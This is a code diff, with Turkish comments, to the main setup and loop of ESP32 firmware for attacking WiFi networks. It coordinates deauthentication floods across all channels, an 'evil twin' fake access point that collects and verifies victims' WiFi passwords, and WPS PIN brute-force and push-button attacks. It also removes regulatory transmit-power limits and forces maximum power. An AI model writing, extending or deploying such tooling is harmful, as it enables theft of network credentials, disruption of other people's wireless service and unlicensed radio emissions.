@@ -1,5 +1,6 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <esp_pm.h>
 #include "types.h"
 #include "web_interface.h"
 #include "deauth.h"
@@ -10,23 +11,78 @@
 
 int curr_channel = 1;
 
-// Periyodik zamanlamalar
-static unsigned long last_csa_send    = 0;
-static unsigned long last_retrack     = 0;
+static unsigned long last_csa_send = 0;
+static unsigned long last_retrack  = 0;
 
-// ─── Maks Performans Ayarları ─────────────────────────────────────────────────
-static void apply_max_performance() {
+// ─── Maks Performans ─────────────────────────────────────────────────────────
+// Hafif sürüm — mod geçişlerinde ve loop'ta güvenle çağrılabilir.
+// WiFi.setSleep / esp_pm_configure BURADA YOK: bunlar WiFi stack'i sıfırlar,
+// sadece setup()'ta bir kez çağrılır.
+void apply_max_performance() {
   setCpuFrequencyMhz(160);
   esp_wifi_set_ps(WIFI_PS_NONE);
-  esp_wifi_set_max_tx_power(84);
+  esp_wifi_set_max_tx_power(84);  // 84 × 0.25 = 21 dBm
   esp_wifi_set_protocol(WIFI_IF_AP,
     WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-  DEBUG_PRINTLN("Maks performans: 160MHz, TX 20dBm, PS kapali");
 }
 
-static inline void reapply_wifi_power() {
+// En hafif yol — her loop iterasyonunda çağrılır
+// WPS PBC handshake sırasında esp_wifi_set_ps STA state machine'ini bozar — koru
+void reapply_wifi_power() {
   esp_wifi_set_max_tx_power(84);
-  esp_wifi_set_ps(WIFI_PS_NONE);
+  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);
+}
+
+// ─── WiFi Olay İşleyici ───────────────────────────────────────────────────────
+// Mod geçişi, WPS, bağlantı/kesilme gibi her olayda TX gücü + PS geri uygula
+static void on_wifi_event(WiFiEvent_t event) {
+  esp_wifi_set_max_tx_power(84);
+  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);
+}
+
+// ─── Tek seferlik başlatma ───────────────────────────────────────────────────
+// WiFi stack'i sıfırlayan işlemler burada, sadece setup()'ta çağrılır.
+static void one_time_hw_init() {
+  // Bluetooth tamamen devre dışı — kullanılmıyor, sadece güç tüketiyor
+  btStop();
+
+  // Regulatory TX limiti kaldır — IDF kendi başına gücü kısıtlamasın
+  wifi_country_t country;
+  memset(&country, 0, sizeof(country));
+  country.cc[0]        = '0';
+  country.cc[1]        = '0';
+  country.schan        = 1;
+  country.nchan        = 13;
+  country.max_tx_power = 20;
+  country.policy       = WIFI_COUNTRY_POLICY_MANUAL;
+  esp_wifi_set_country(&country);
+
+  // Arduino WiFi uyku katmanını kapat (esp_wifi_set_ps'den bağımsız)
+  WiFi.setSleep(false);
+
+  // CPU PM kilidi: OS dinamik frekans düşürme + light sleep tamamen kapalı
+#if defined(CONFIG_IDF_TARGET_ESP32C3)
+  esp_pm_config_esp32c3_t pm_cfg = {
+    .max_freq_mhz       = 160,
+    .min_freq_mhz       = 160,
+    .light_sleep_enable = false
+  };
+  esp_pm_configure(&pm_cfg);
+#elif defined(CONFIG_IDF_TARGET_ESP32S3)
+  esp_pm_config_esp32s3_t pm_cfg = {
+    .max_freq_mhz       = 240,
+    .min_freq_mhz       = 240,
+    .light_sleep_enable = false
+  };
+  esp_pm_configure(&pm_cfg);
+#else
+  esp_pm_config_esp32_t pm_cfg = {
+    .max_freq_mhz       = 240,
+    .min_freq_mhz       = 240,
+    .light_sleep_enable = false
+  };
+  esp_pm_configure(&pm_cfg);
+#endif
 }
 
 void setup() {
@@ -38,35 +94,41 @@ void setup() {
 #endif
 
   passwords_init();
-  apply_max_performance();
 
-  WiFi.mode(WIFI_MODE_AP);
+  // Ağır tek-seferlik donanım başlatma — WiFi başlamadan önce
+  one_time_hw_init();
+
+  // WiFi olaylarına abone ol — her olay TX gücünü geri yükler
+  WiFi.onEvent(on_wifi_event);
+
+  // APSTA modunda başla — WPS saldırısı başlatılırken mod değişimi olmaz,
+  // AP hiç kapanmaz. STA arayüzü WPS / şifre testi için hazır bekler.
+  WiFi.mode(WIFI_MODE_APSTA);
   WiFi.softAP(AP_SSID, AP_PASS);
+
+  // softAP TX gücü sıfırlayabilir — hemen geri uygula
+  apply_max_performance();
 
   start_web_interface();
   DEBUG_PRINTLN("Hazir. 192.168.4.1 adresine baglanin.");
 }
 
 void loop() {
+  // Her iterasyonda TX gücü + PS zorla sabit
+  reapply_wifi_power();
+
   if (deauth_type == DEAUTH_TYPE_ALL) {
-    // Tüm kanallara deauth — web sunucu duruyor, sadece kanal döngüsü
     if (curr_channel > CHANNEL_MAX) curr_channel = 1;
     esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
     curr_channel++;
     delay(10);
 
   } else if (evil_twin_active) {
-    // ── Evil Twin şifre testi (submit'ten sonra main loop devralır) ──────────
     if (et_test_pending && !et_result_ready) {
-      // WPS çalışıyorsa esp_wifi_connect() çağrısından ÖNCE temiz kapat.
-      // esp_wifi_connect() WPS'i aniden iptal eder ve WiFi stack'i yarım
-      // bırakılmış WPS durumunda tutar; sonrasında esp_wifi_wps_enable()
-      // STA henüz IDLE değilken çağrılınca sessizce başarısız olur.
-      // Önce kapatılırsa stack temiz IDLE'da kalır.
       bool wps_was_running = et_wps_pbc_running;
       if (wps_was_running) {
         et_stop_wps_pbc();
-        delay(300);  // WPS kapanma geçiş süresi
+        delay(300);
       }
 
       et_result_correct = evil_twin_test_password(et_tested_password);
@@ -79,7 +141,6 @@ void loop() {
         stop_evil_twin();
         led_on();
       } else if (wps_was_running) {
-        // Şifre yanlış — WiFi stack tamamen IDLE'a dönmesi için bekle
         delay(800);
         et_start_wps_pbc();
       }
@@ -88,13 +149,23 @@ void loop() {
     web_interface_handle_client();
 
   } else if (wps_attack_state == WPS_ATTACKING) {
-    // ── WPS PIN brute force — her iterasyon bir PIN denemesi ─────────────────
-    wps_loop();                   // ~18s bloke eder; içinde handleClient() var
-    web_interface_handle_client();// döngü arası ara istek karşıla
+    wps_loop();
+    web_interface_handle_client();
 
   } else {
-    // Normal mod: deauth tek ağ veya bekleme
     web_interface_handle_client();
+
+    // WPS tarama — redirect gönderildikten sonra buraya gelir, AP sağlam kalır
+    if (wps_scan_pending) {
+      wps_scan_pending = false;
+      wps_scan();
+    }
+
+    // WPS saldırı başlatma — redirect gönderildikten sonra buraya gelir
+    if (wps_attack_pending) {
+      wps_attack_pending = false;
+      wps_start_attack(wps_attack_pending_idx);
+    }
 
     unsigned long now = millis();
 
